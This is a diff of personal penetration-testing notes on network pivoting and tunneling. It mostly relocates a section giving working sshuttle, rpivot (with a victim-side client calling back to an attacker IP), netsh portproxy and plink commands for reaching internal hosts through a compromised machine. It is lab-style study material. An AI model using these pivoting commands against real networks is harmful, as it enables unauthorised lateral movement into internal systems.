@@ -38,44 +38,6 @@ Windows: `net view [target-IP]` to see what foothold machine can access on inter
 
 `arp -a` in CMD will show discovered network devices
 
-# Pivoting Around Obstacles
-
-
-#### SSH Pivoting
-
-- `Sshuttle` is a Python tool that removes the need for proxychains for ssh specifically.
-- `sudo sshuttle -r victim@IP 172.16.5.0/23 -v`
-	- This command routes traffic to the listed address range through the victim host connection.
-
-#### Web Server Pivot
-Does not work with Python3!
-
-- `Rpivot` is a reverse SOCKS proxy tool that will let you connect to internal web server through an external pivot host.
-	- `git clone https://github.com/klsecservices/rpivot.git`
-- `python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0`
-	- This will have the attack machine serve on port 9999 for the victim to connect to
-- Transfer `rpivot` directory to web server victim with `scp`
-- on victim server: `python2.7 client.py --server-ip [attacker-IP] --server-port 9999`
-- Now use `proxychains firefox-esr [internal_IP]:80` to connect to the internal webserver.
-	- You can add NTLM authentication if necessary for the internal server.
-	- Add the following in addition to the arguments above: `--ntlm-proxy-ip` , `--ntlm-proxy-port` , `--domain` , `--username` , `--password` 
-
-#### Windows Port Forward with Netsh
-(sometimes requires command prompt to be run as administrator to use netsh)
-
-- `Netsh` is a Windows tool that can do several network config tasks such as find routes, view firewall configs, add proxies, and create port forwarding rules. If we have a Windows pivot host, `Netsh` affords us these options for pivoting.
-- Port forward: `netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=[pivot_IP] connectport=3389 connectaddress=[internal_IP]`
-- To verify forwarding: `netsh.exe interface portproxy show v4tov4`
-- You can now connect to the Windows pivot host with the attacking machine and RDP to the internal host through the port we forwarded (`[pivot_IP]:8080`)
-
-#### From a Windows Attack Host
-
-- `plink.exe` is a PuTTY Link tool that acts as an ssh server for linux hosts. Before 2018, Windows did not have an ssh client and PuTTY was necessary.
-- `plink -ssh -D 9050 hostname@IP_address`
-	- This would be used from a Windows attack host to a victim Linux server.
-	- It establishes local port 9050 for dynamic port forwarding through ssh on the linux target.
-- `Proxifier` can be used to start a SOCKS tunnel via the ssh session from `plink`
-	- Configure the SOCKS server for 127.0.0.1 and the port 9050 we used earlier. Start `mstsc.exe` to begin an RDP session with a Windows target that allows RDP.
 
 # Tunneling
 
@@ -95,6 +57,7 @@ Does not work with Python3!
 	- You can execute multiple of these in one command by repeating the `-L` flag with new arguments.
 	- Ex. forwarding both MySQL and HTTP from target to our machine: `ssh -L 1234:localhost:3306 -L 8080:localhost:80 user@IP` 
 - To confirm the tunneling, `nmap -sV -p1234 localhost` 
+- use `-N` to skip the shell if you're just port forwarding
 
 ### SOCKS Tunneling with SSH
 
@@ -214,3 +177,42 @@ Step 2: `Proxifier`
 - Start mstsc.exe (again) and Proxifier will route our traffic through 1080 to the RDP session on the internal target
 	- I needed to run mstsc.exe from the file explorer rather than command line
 - In RDP menu, try setting experience to `modem` if you have slow connetion
+
+# Pivoting Around Obstacles
+
+
+#### SSH Pivoting
+
+- `Sshuttle` is a Python tool that removes the need for proxychains for ssh specifically.
+- `sudo sshuttle -r victim@IP 172.16.5.0/23 -v`
+	- This command routes traffic to the listed address range through the victim host connection.
+
+#### Web Server Pivot
+Does not work with Python3!
+
+- `Rpivot` is a reverse SOCKS proxy tool that will let you connect to internal web server through an external pivot host.
+	- `git clone https://github.com/klsecservices/rpivot.git`
+- `python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0`
+	- This will have the attack machine serve on port 9999 for the victim to connect to
+- Transfer `rpivot` directory to web server victim with `scp`
+- on victim server: `python2.7 client.py --server-ip [attacker-IP] --server-port 9999`
+- Now use `proxychains firefox-esr [internal_IP]:80` to connect to the internal webserver.
+	- You can add NTLM authentication if necessary for the internal server.
+	- Add the following in addition to the arguments above: `--ntlm-proxy-ip` , `--ntlm-proxy-port` , `--domain` , `--username` , `--password` 
+
+#### Windows Port Forward with Netsh
+(sometimes requires command prompt to be run as administrator to use netsh)
+
+- `Netsh` is a Windows tool that can do several network config tasks such as find routes, view firewall configs, add proxies, and create port forwarding rules. If we have a Windows pivot host, `Netsh` affords us these options for pivoting.
+- Port forward: `netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=[pivot_IP] connectport=3389 connectaddress=[internal_IP]`
+- To verify forwarding: `netsh.exe interface portproxy show v4tov4`
+- You can now connect to the Windows pivot host with the attacking machine and RDP to the internal host through the port we forwarded (`[pivot_IP]:8080`)
+
+#### From a Windows Attack Host
+
+- `plink.exe` is a PuTTY Link tool that acts as an ssh server for linux hosts. Before 2018, Windows did not have an ssh client and PuTTY was necessary.
+- `plink -ssh -D 9050 hostname@IP_address`
+	- This would be used from a Windows attack host to a victim Linux server.
+	- It establishes local port 9050 for dynamic port forwarding through ssh on the linux target.
+- `Proxifier` can be used to start a SOCKS tunnel via the ssh session from `plink`
+	- Configure the SOCKS server for 127.0.0.1 and the port 9050 we used earlier. Start `mstsc.exe` to begin an RDP session with a Windows target that allows RDP.
